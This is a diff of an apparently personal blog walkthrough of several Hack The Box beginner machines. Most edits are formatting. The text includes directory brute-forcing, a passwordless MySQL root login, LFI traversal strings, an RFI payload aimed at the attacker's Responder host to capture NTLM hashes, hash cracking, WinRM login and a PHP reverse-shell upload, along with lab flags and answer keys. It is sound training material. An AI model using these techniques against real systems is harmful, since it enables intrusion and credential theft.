@@ -27,7 +27,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ### http
-Since port 80 is open, let's check the browser to see what the IP address gives us.
+Since `port 80` is open, let's check the browser to see what the IP address gives us.
 
 ![login](/img/tier1/login.png)
 
@@ -38,7 +38,9 @@ Perhaps this isn't the point of entry, let's try to find any useful subdirectori
 ### gobuster
 `gobuster` (`sudo apt install gobuster`) is a tool that bruteforces urls in order to find subdomains, subdirectories, and files. Let's run a simple scan on this IP and store the output in `gobuster.out` for later reference.
 
-`gobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z`
+```shell {linenos=false}
+$ gobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z
+```
 
 *(note: `sudo apt install seclists` if you do not already have this directory)*
 
@@ -52,7 +54,7 @@ Perhaps this isn't the point of entry, let's try to find any useful subdirectori
 This will give us the following output:
 ![gobuster](/img/tier1/gobuster.png)
 
-After looking at these subdirectories, nothing glaring stood out.Perhaps we can pivot back to the login page and try `SQL Injection`.
+After looking at these subdirectories, nothing glaringly stood out. Perhaps we can pivot back to the login page and try `SQL Injection`.
 
 ### SQL
 `SQL` (Structured Query Language) is a programming language used in order to store, manipulate, or retrive data in databases. `SQL Injection` (sqli) is a technique used to inject SQL commands via the front end to leak information from the database. 
@@ -69,17 +71,28 @@ As you can see, it takes a bit of trial and error, hence how automation (through
 ![appointment](/img/tier1/appointment.png)
 
 ### Questions
-- What does the acronym SQL stand for? `Structured Query Language`
-- What is one of the most common type of SQL vulnerabilities? `SQL Injection`
-- What does PII stand for? `Personally Identifiable Information`
-- What does the OWASP Top 10 list name the classification for this vulnerability? `A03:2021-Injection`
-- What service and version are running on port 80 of the target? `Apache httpd 2.4.38 ((Debian))`
-- What is the standard port used for the HTTPS protocol? `443`
-- What is one luck-based method of exploiting login pages? `brute-forcing`
-- What is a folder called in web-application terminology? `directory`
-- What response code is given for "Not Found" errors? `404`
-- What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? `dir`
-- What symbol do we use to comment out parts of the code? `#`
+- What does the acronym SQL stand for? 
+`Structured Query Language`
+- What is one of the most common type of SQL vulnerabilities? 
+`SQL Injection`
+- What does PII stand for? 
+`Personally Identifiable Information`
+- What does the OWASP Top 10 list name the classification for this vulnerability?
+`A03:2021-Injection`
+- What service and version are running on port 80 of the target? 
+`Apache httpd 2.4.38 ((Debian))`
+- What is the standard port used for the HTTPS protocol? 
+`443`
+- What is one luck-based method of exploiting login pages? 
+`brute-forcing`
+- What is a folder called in web-application terminology? 
+`directory`
+- What response code is given for "Not Found" errors? 
+`404`
+- What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? 
+`dir`
+- What symbol do we use to comment out parts of the code? 
+`#`
 
 **flag:** `e3d0796d002a446c0e622226f42e9672`
 
@@ -119,7 +132,9 @@ Since `port 3306` is open, lets take a look into connecting to `mysql` (`sudo ap
 
 We can run the following command and try for root right away:
 
-`mysql -h 10.129.152.89 -u root`
+```shell {linenos=false}
+$ mysql -h 10.129.152.89 -u root
+```
 
 *command tags:*
 - `-h`: host IP
@@ -131,21 +146,33 @@ Bingo!
 
 Now we can just run a few sql commands and profit:
 
-`show databases;`
-`use htb;`
-`show tables;`
-`select * from config;`
+```shell {linenos=false}
+> show databases
+...
+> use htb;
+...
+> show tables;
+...
+> select * from config;
+```
 
 ![sequel](/img/tier1/sequel.png)
 
 ### Questions 
-- What does the acronym SQL stand for? `Structured Query Language`
-- During our scan, which port running mysql do we find? `3306`
-- What community-developed MySQL version is the target running? `MariaDB`
-- What switch do we need to use in order to specify a login username for the MySQL service? `-u`
-- Which username allows us to log into MariaDB without providing a password? `root`
-- What symbol can we use to specify within the query that we want to display everything inside a table? `*`
-- What symbol do we need to end each query with? `;`
+- What does the acronym SQL stand for? 
+`Structured Query Language`
+- During our scan, which port running mysql do we find? 
+`3306`
+- What community-developed MySQL version is the target running? 
+`MariaDB`
+- What switch do we need to use in order to specify a login username for the MySQL service? 
+`-u`
+- Which username allows us to log into MariaDB without providing a password? 
+`root`
+- What symbol can we use to specify within the query that we want to display everything inside a table? 
+`*`
+- What symbol do we need to end each query with? 
+`;`
 
 **flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`
 
@@ -191,7 +218,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ![ftp](/img/tier1/ftp.png)
 
-*allowed.userlist:*
+*file: allowed.userlist:*
 ```
 aron
 pwnmeow
@@ -199,7 +226,7 @@ egotisticalsw
 admin
 ```
 
-*allowed.userlist.password:*
+*file: allowed.userlist.password:*
 ```
 root
 Supersecretpassword1
@@ -217,9 +244,9 @@ After clicking around, nothing seemed promising. Let's throw it in `gobuster` to
 ### gobuster
 We've done this before! (see above)
 
-`gobuster dir -u http://10.129.228.114 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z`
+```shell {linenos=false}
+$ gobuster dir -u http://10.129.228.114 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z
 
-```
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -253,15 +280,24 @@ Going for the throat with the `admin:rKXM59ESxesUFHAd` grants us access and the 
 ![crocodile](/img/tier1/crocodile.png)
 
 ### Questions
-- What nmap scanning switch employs the use of default scripts during a scan? `-sC`
-- What service version is found to be running on port 21? `vsftpd 3.0.3`
-- What FTP code is returned to us for the "Anonymous FTP login allowed" message? `230`
-- What command can we use to download the files we find on the FTP server? `get`
-- What is one of the higher-privilege sounding usernames in the list we retrieved? `admin`
-- What version of Apache HTTP Server is running on the target host? `2.4.41`
-- What is the name of a handy web site analysis plug-in we can install in our browser? `Wappalyzer`
-- What switch can we use with gobuster to specify we are looking for specific filetypes? `-x`
-- What file have we found that can provide us a foothold on the target? `login.php`
+- What nmap scanning switch employs the use of default scripts during a scan? 
+`-sC`
+- What service version is found to be running on port 21? 
+`vsftpd 3.0.3`
+- What FTP code is returned to us for the "Anonymous FTP login allowed" message? 
+`230`
+- What command can we use to download the files we find on the FTP server? 
+`get`
+- What is one of the higher-privilege sounding usernames in the list we retrieved? 
+`admin`
+- What version of Apache HTTP Server is running on the target host? 
+`2.4.41`
+- What is the name of a handy web site analysis plug-in we can install in our browser? 
+`Wappalyzer`
+- What switch can we use with gobuster to specify we are looking for specific filetypes? 
+`-x`
+- What file have we found that can provide us a foothold on the target? 
+`login.php`
 
 **flag:** `c7110277ac44d78b6a9fff2232434d16`
 
@@ -296,7 +332,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Looks like the IP is getting redirected to `unika.htb`. Let's add this to `/etc/hosts` to map the hostname to the IP address to help `DNS`.
 
-*/etc/hosts:*
+*file: /etc/hosts*
 ```
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -314,31 +350,34 @@ After clicking around, something stood out after changing the language to French
 
 `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`
 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;:arrow_down::arrow_down::arrow_down:
-```
-# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by 
-Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to 
-host names. Each # entry should be kept on an individual line. The IP address should 
-# be placed in the first column followed by the corresponding host name. # The IP 
-address and the host name should be separated by at least one # space. # # 
-Additionally, comments (such as these) may be inserted on individual # lines or 
-following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 
-rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost 
-name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
+``` {linenos=false}
+# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft 
+TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # 
+entry should be kept on an individual line. The IP address should # be placed in the first
+column followed by the corresponding host name. # The IP address and the host name should be 
+separated by at least one # space. # # Additionally, comments (such as these) may be inserted 
+on individual # lines or following the machine name denoted by a '#' symbol. # # For example:
+# # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host #
+localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
 ```
 
 Now that we know we can access files on the server, an `LFI` (Local File Incluse) vulnerability, perhaps we there is an `RFI` (Remote File Incluse) vulnerability. From our `nmap`, we know that the server hosting this page is a `Windows` machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about `NTLM`.
 
 ### NTLM
-`NTLM` (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Noteably, it is a `single sign-on` (SSO) which allows requires users to only be authenticated once. More details of `NTLM` and the authentication process can be found on [Crowdstrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/). Basically, there are tools - such as `Responder` - which allow us to listen in on the NTLM authentication and capture the `NetNTLMv2` hash. If we are able to crack this hash, we can then gain access to the server. Let's give it a go.
+`NTLM` (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Noteably, it is a `single sign-on` (SSO) which allows requires users to only be authenticated once. More details of `NTLM` and the authentication process can be found on [Crowdstrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/). Basically, there are tools — such as `Responder` — which allow us to listen in on the NTLM authentication and capture the `NetNTLMv2` hash. If we are able to crack this hash, we can then gain access to the server. Let's give it a go.
 
 ### Responder
 `Responder` (`git clone https://github.com/lgandx/Responder`), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the `NetNTLMv2` hash. This can be done by:
 
-`sudo python3 Responder.py -I tun0`
+```shell {linenos=false}
+$ sudo python3 Responder.py -I tun0
+```
 
-Now we will have the server interact with this SMB server (hosted on your client IP - mine being `10.10.14.165`) by changing the URL in our browser to:
+Now we will have the server interact with this SMB server (hosted on your client IP — mine being `10.10.14.165`) by changing the URL in our browser to:
 
-`http://unika.htb/index.php?page=//10.10.14.165/any_file_name`
+```{linenos=false}
+http://unika.htb/index.php?page=//10.10.14.165/any_file_name
+```
 
 Hash acquired!
 
@@ -349,9 +388,9 @@ We just need to crack it.
 ### john the ripper
 `john` (john the ripper) is one commonly used hash cracking tools. Let's copy this hash from `Responder` and throw it into a text file such as `hashed.txt`. Let `john` do the rest:
 
-`john -w=/usr/share/wordlists/rockyou.txt hashed.txt`
+```shell {linenos=false}
+$ john -w=/usr/share/wordlists/rockyou.txt hashed.txt
 
-```
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
@@ -367,27 +406,41 @@ There we go... `Administrator:badminton`. Time to exploit.
 ### WinRM
 `winrm` (Windows Remote Management) is a protocol that allows devices to access a system remotely. `evil-winrm` is a tool that allows us to connect to a windows machine and still be able to use `Powershell` on `Linux`. 
 
-`evil-winrm -i 10.129.245.210 -u Administrator -p badminton`
+```shell {linenos=false}
+$ evil-winrm -i 10.129.245.210 -u Administrator -p badminton
+```
 
 We are in. Now we can run a PowerShell command to look for the flag so we don't have to!
 
-`Get-ChildItem -Path C:\ -Filter flag.txt -Recurse`
+```shell {linenos=false}
+> Get-ChildItem -Path C:\ -Filter flag.txt -Recurse
+```
 
 Box popped. 
 
 ![responder](/img/tier1/responder.png)
 
 ### Questions
-- When visiting the web service using the IP address, what is the domain that we are being redirected to? `unika.htb`
-- Which scripting language is being used on the server to generate webpages? `php`
-- What is the name of the URL parameter which is used to load different language versions of the webpage? `page`
-- Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" `../../../../../../../../windows/system32/drivers/etc/hosts`
-- Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" `//10.10.14.6/somefile`
-- What does NTLM stand for? `New Technology Lan Manager`
-- Which flag do we use in the Responder utility to specify the network interface? `-I`
-- There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. `John The Ripper`
-- What is the password for the administrator user? `badminton`
-- We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? `5985`
+- When visiting the web service using the IP address, what is the domain that we are being redirected to? 
+`unika.htb`
+- Which scripting language is being used on the server to generate webpages? 
+`php`
+- What is the name of the URL parameter which is used to load different language versions of the webpage? 
+`page`
+- Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
+`../../../../../../../../windows/system32/drivers/etc/hosts`
+- Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
+`//10.10.14.6/somefile`
+- What does NTLM stand for? 
+`New Technology Lan Manager`
+- Which flag do we use in the Responder utility to specify the network interface? 
+`-I`
+- There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
+`John The Ripper`
+- What is the password for the administrator user? 
+`badminton`
+- We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
+`5985`
 
 **flag:** `ea81b7afddd03efaa0945333ed147fac`
 
@@ -429,7 +482,9 @@ This section caused problems for me.
 
 First, I looked for subdirectories:
 
-`gobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+```shell {linenos=false}
+$ gobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
 
 This proved unhelpful with only the `/images` directory found.
 
@@ -437,21 +492,27 @@ This proved unhelpful with only the `/images` directory found.
 
 I then tried running `gobuster` to look for subdomains hosted on the same IP using the `vhost` feature.
 
-`gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z`
+```shell {linenos=false}
+$ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z
+```
 
 I tested several of the number outputs by adding them to `/etc/hosts`, but none of them worked. I then updated the `wordlist` to remove all of these inputs that contain numbers through a simple python script. 
 
-`sudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out`
+```shell {linenos=false}
+$ sudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out
+```
 
 This only found the following subdomain (which failed after testing)
-```
+```{linenos=false}
 Found: gc._msdcs Status: 400 [Size: 306]
 ```
 
 ### ffuf
 Next, I tried switching to `ffuf` as `gobuster` seemed to be failing me. 
 
-`ffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetopper.htb" -fc 200`
+```shell {linenos=false}
+$ ffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetopper.htb" -fc 200
+```
 
 Still, no luck. 
 
@@ -466,19 +527,27 @@ NOW, moving on...
 ### s3
 The `Amazon S3 bucket` (or `s3` for short) is a cloud-based storage service which contains `s3` objects. We can use the `awscli` (`sudo apt install awscli`) to try to interact with this bucket.
 
-`aws configure`
+```shell {linenos=false}
+$ aws configure
+```
 ![config](/img/tier1/config.png)
 
 Then we can look at all the `s3` buckets:
 
-`aws --endpoint=http://s3.thetoppers.htb s3 ls`
+```shell {linenos=false}
+$ aws --endpoint=http://s3.thetoppers.htb s3 ls
+```
 
 and all the objects in a bucket:
-`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
+```shell {linenos=false}
+$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
 
 There seems nothing of particular value in the bucket, but we can try and add a malicious `php` file and get a `reverse shell`. I typically take [pentestmonkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) template and change the `$ip` and `port` accordingly. To upload:
 
-`aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
+```shell {linenos=false}
+$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
 
 We are in.
 
